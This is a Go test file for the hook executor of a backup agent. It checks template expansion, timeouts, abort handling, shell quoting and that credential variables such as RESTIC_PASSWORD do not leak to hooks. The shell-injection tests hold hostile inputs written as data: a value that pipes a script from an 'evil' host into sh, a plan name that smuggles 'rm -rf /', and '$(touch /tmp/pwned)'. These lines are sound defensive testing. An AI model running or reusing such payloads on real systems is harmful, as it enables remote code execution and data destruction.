package executor

import (
	"context"
	"log/slog"
	"strings"
	"testing"

	backupv1 "github.com/tryy3/backup-orchestrator/agent/internal/gen/backup/v1"
)

func discardLogger() *slog.Logger {
	return slog.New(slog.NewTextHandler(devNull{}, nil))
}

type devNull struct{}

func (devNull) Write(p []byte) (int, error) { return len(p), nil }

func TestExpandTemplate_SimpleSubstitution(t *testing.T) {
	hctx := &HookContext{
		PlanName:   "daily",
		Status:     "success",
		SnapshotID: "abc123",
	}
	got := expandTemplate("backup {{.PlanName}} status={{.Status}} snap={{.SnapshotID}}", hctx)
	want := "backup 'daily' status='success' snap='abc123'"
	if got != want {
		t.Errorf("got %q, want %q", got, want)
	}
}

func TestExpandTemplate_NoPlaceholders(t *testing.T) {
	got := expandTemplate("echo hello", &HookContext{})
	if got != "echo hello" {
		t.Errorf("got %q, want %q", got, "echo hello")
	}
}

func TestExpandTemplate_UnknownPlaceholderPassthrough(t *testing.T) {
	// Unknown placeholders are left unchanged.
	got := expandTemplate("echo {{.Broken", &HookContext{})
	if got != "echo {{.Broken" {
		t.Errorf("got %q, want %q", got, "echo {{.Broken")
	}
}

func TestExpandTemplate_UnrecognisedFieldPassthrough(t *testing.T) {
	// Unrecognised {{.FieldName}} placeholders are left unchanged.
	got := expandTemplate("echo {{.NonExistent}}", &HookContext{})
	if got != "echo {{.NonExistent}}" {
		t.Errorf("got %q, want %q", got, "echo {{.NonExistent}}")
	}
}

func TestRunHook_Success(t *testing.T) {
	hook := &backupv1.ResolvedHook{
		Name:           "test-hook",
		OnEvent:        "after_backup",
		Command:        "echo hello",
		TimeoutSeconds: 5,
	}
	hctx := &HookContext{PlanName: "test"}
	result := RunHook(context.Background(), hook, hctx, discardLogger())

	if result.Status != "success" {
		t.Errorf("status: got %q, want success", result.Status)
	}
	if result.HookName != "test-hook" {
		t.Errorf("hook name: got %q", result.HookName)
	}
	if result.Output != "hello" {
		t.Errorf("output: got %q, want %q", result.Output, "hello")
	}
	if result.DurationMs < 0 {
		t.Errorf("duration should be non-negative: %d", result.DurationMs)
	}
}

func TestRunHook_Failure(t *testing.T) {
	hook := &backupv1.ResolvedHook{
		Name:           "fail-hook",
		OnEvent:        "after_backup",
		Command:        "exit 1",
		TimeoutSeconds: 5,
	}
	result := RunHook(context.Background(), hook, &HookContext{}, discardLogger())

	if result.Status != "failed" {
		t.Errorf("status: got %q, want failed", result.Status)
	}
}

func TestRunHook_UnknownPlaceholder(t *testing.T) {
	// Unknown placeholders are passed through unchanged; the hook still runs.
	hook := &backupv1.ResolvedHook{
		Name:           "unknown-placeholder",
		OnEvent:        "before_backup",
		Command:        "echo {{.Unknown}}",
		TimeoutSeconds: 5,
	}
	result := RunHook(context.Background(), hook, &HookContext{}, discardLogger())

	if result.Status != "success" {
		t.Errorf("status: got %q, want success", result.Status)
	}
}

func TestRunHook_Timeout(t *testing.T) {
	hook := &backupv1.ResolvedHook{
		Name:           "slow-hook",
		OnEvent:        "after_backup",
		Command:        "sleep 30",
		TimeoutSeconds: 1,
	}
	result := RunHook(context.Background(), hook, &HookContext{}, discardLogger())

	if result.Status != "failed" {
		t.Errorf("status: got %q, want failed", result.Status)
	}
}

func TestRunHooks_FiltersByEvent(t *testing.T) {
	hooks := []*backupv1.ResolvedHook{
		{Name: "h1", OnEvent: "before_backup", Command: "echo before", TimeoutSeconds: 5},
		{Name: "h2", OnEvent: "after_backup", Command: "echo after", TimeoutSeconds: 5},
		{Name: "h3", OnEvent: "before_backup", Command: "echo before2", TimeoutSeconds: 5, SortOrder: 2},
	}
	results, aborted := RunHooks(context.Background(), hooks, "before_backup", &HookContext{}, discardLogger())

	if aborted {
		t.Error("unexpected abort")
	}
	if len(results) != 2 {
		t.Fatalf("expected 2 results, got %d", len(results))
	}
}

func TestRunHooks_SortOrder(t *testing.T) {
	hooks := []*backupv1.ResolvedHook{
		{Name: "second", OnEvent: "test", Command: "echo 2", SortOrder: 2, TimeoutSeconds: 5},
		{Name: "first", OnEvent: "test", Command: "echo 1", SortOrder: 1, TimeoutSeconds: 5},
	}
	results, _ := RunHooks(context.Background(), hooks, "test", &HookContext{}, discardLogger())

	if len(results) != 2 {
		t.Fatalf("expected 2 results, got %d", len(results))
	}
	if results[0].HookName != "first" {
		t.Errorf("first result: got %q, want %q", results[0].HookName, "first")
	}
	if results[1].HookName != "second" {
		t.Errorf("second result: got %q, want %q", results[1].HookName, "second")
	}
}

func TestRunHooks_AbortOnError(t *testing.T) {
	hooks := []*backupv1.ResolvedHook{
		{Name: "fail", OnEvent: "test", Command: "exit 1", OnError: "abort", SortOrder: 1, TimeoutSeconds: 5},
		{Name: "skip", OnEvent: "test", Command: "echo ok", SortOrder: 2, TimeoutSeconds: 5},
	}
	results, aborted := RunHooks(context.Background(), hooks, "test", &HookContext{}, discardLogger())

	if !aborted {
		t.Error("expected abort")
	}
	if len(results) != 1 {
		t.Fatalf("expected 1 result (aborted), got %d", len(results))
	}
}

func TestRunHooks_ContinueOnError(t *testing.T) {
	hooks := []*backupv1.ResolvedHook{
		{Name: "fail", OnEvent: "test", Command: "exit 1", OnError: "continue", SortOrder: 1, TimeoutSeconds: 5},
		{Name: "ok", OnEvent: "test", Command: "echo ok", SortOrder: 2, TimeoutSeconds: 5},
	}
	results, aborted := RunHooks(context.Background(), hooks, "test", &HookContext{}, discardLogger())

	if aborted {
		t.Error("unexpected abort")
	}
	if len(results) != 2 {
		t.Fatalf("expected 2 results, got %d", len(results))
	}
	if results[0].Status != "failed" {
		t.Errorf("first should be failed, got %q", results[0].Status)
	}
	if results[1].Status != "success" {
		t.Errorf("second should be success, got %q", results[1].Status)
	}
}

func TestRunHooks_EmptyHookList(t *testing.T) {
	results, aborted := RunHooks(context.Background(), nil, "test", &HookContext{}, discardLogger())
	if aborted {
		t.Error("unexpected abort")
	}
	if len(results) != 0 {
		t.Errorf("expected 0 results, got %d", len(results))
	}
}

// TestShellQuote verifies that shellQuote produces safe POSIX single-quoted output.
func TestShellQuote(t *testing.T) {
	cases := []struct {
		input string
		want  string
	}{
		{"daily", "'daily'"},
		{"", "''"},
		{"hello world", "'hello world'"},
		// Single quote within value must be safely escaped.
		{"it's", "'it'\\''s'"},
		// Shell injection attempt must be neutralised.
		{`foo"; curl https://evil/x.sh | sh; "`, `'foo"; curl https://evil/x.sh | sh; "'`},
		{"`evil`", "'" + "`evil`" + "'"},
		{"$(evil)", "'$(evil)'"},
	}
	for _, tc := range cases {
		got := shellQuote(tc.input)
		if got != tc.want {
			t.Errorf("shellQuote(%q) = %q, want %q", tc.input, got, tc.want)
		}
	}
}

// TestExpandTemplate_ShellInjectionPrevented verifies that a malicious plan name
// or error string cannot break out of its shell argument context.
func TestExpandTemplate_ShellInjectionPrevented(t *testing.T) {
	hctx := &HookContext{
		PlanName: `evil"; rm -rf /; echo "`,
		Error:    "$(touch /tmp/pwned)",
	}
	expanded := expandTemplate(`notify --plan={{.PlanName}} --error={{.Error}}`, hctx)
	// The literal values must appear as shell-safe single-quoted tokens.
	wantPlan := shellQuote(hctx.PlanName)
	wantError := shellQuote(hctx.Error)
	if !strings.Contains(expanded, wantPlan) {
		t.Errorf("PlanName not shell-quoted; want %q in %q", wantPlan, expanded)
	}
	if !strings.Contains(expanded, wantError) {
		t.Errorf("Error not shell-quoted; want %q in %q", wantError, expanded)
	}
}

// TestRunHook_EnvDoesNotLeakSensitiveVars verifies that RESTIC_PASSWORD and
// similar credential variables from the parent environment are not passed to
// hook subprocesses.
func TestRunHook_EnvDoesNotLeakSensitiveVars(t *testing.T) {
	t.Setenv("RESTIC_PASSWORD", "super-secret-password")
	t.Setenv("RCLONE_CONFIG", "/path/to/rclone.conf")

	// Use echo + shell parameter expansion: outputs empty string when var is unset.
	hook := &backupv1.ResolvedHook{
		Name:           "env-check",
		OnEvent:        "after_backup",
		Command:        `echo "pass=${RESTIC_PASSWORD}" "rclone=${RCLONE_CONFIG}"`,
		TimeoutSeconds: 5,
	}
	result := RunHook(context.Background(), hook, &HookContext{}, discardLogger())

	if result.Status != "success" {
		t.Fatalf("hook failed: %s", result.Error)
	}
	if strings.Contains(result.Output, "super-secret-password") {
		t.Error("RESTIC_PASSWORD leaked into hook subprocess output")
	}
	if strings.Contains(result.Output, "/path/to/rclone.conf") {
		t.Error("RCLONE_CONFIG leaked into hook subprocess output")
	}
}

// TestRunHook_BackupEnvVarsAvailable verifies that BACKUP_* context variables
// are available inside the hook subprocess.
func TestRunHook_BackupEnvVarsAvailable(t *testing.T) {
	hook := &backupv1.ResolvedHook{
		Name:           "env-available",
		OnEvent:        "after_backup",
		Command:        "echo plan=$BACKUP_PLAN_NAME status=$BACKUP_STATUS",
		TimeoutSeconds: 5,
	}
	hctx := &HookContext{PlanName: "nightly", Status: "success"}
	result := RunHook(context.Background(), hook, hctx, discardLogger())

	if result.Status != "success" {
		t.Fatalf("hook failed: %s", result.Error)
	}
	if !strings.Contains(result.Output, "plan=nightly") {
		t.Errorf("BACKUP_PLAN_NAME not available in hook output: %q", result.Output)
	}
	if !strings.Contains(result.Output, "status=success") {
		t.Errorf("BACKUP_STATUS not available in hook output: %q", result.Output)
	}
}
